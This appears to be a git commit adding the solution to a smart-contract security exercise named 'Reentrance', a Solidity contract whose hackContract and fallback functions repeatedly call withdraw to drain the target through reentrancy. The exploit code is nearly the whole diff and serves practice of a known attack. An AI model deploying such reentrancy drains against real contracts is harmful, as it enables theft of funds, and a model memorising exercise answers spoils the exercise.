a1fe399b109cf6f738cf9d5d134e200820e9d745
ilija <ilijapet@protonmail.com>
2022-08-30 11:02:07 +0200

    solution for test no 6. Reentrance

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -3,13 +3,18 @@ pragma solidity ^0.8.9;
 import "./Reentrance.sol";
 
 contract AttackingReentrance {
-    address payable public contractAddress;
+    Reentrance public reentranceContract;
 
     constructor(address payable _contractAddress) payable {
-        contractAddress = _contractAddress;
+        reentranceContract = Reentrance(_contractAddress);
     }
 
     function hackContract() external {
-        // Code me!
+        reentranceContract.donate{value: address(this).balance}(address(this));
+        reentranceContract.withdraw();
+    }
+
+    fallback() external payable {
+        reentranceContract.withdraw();
     }
 }
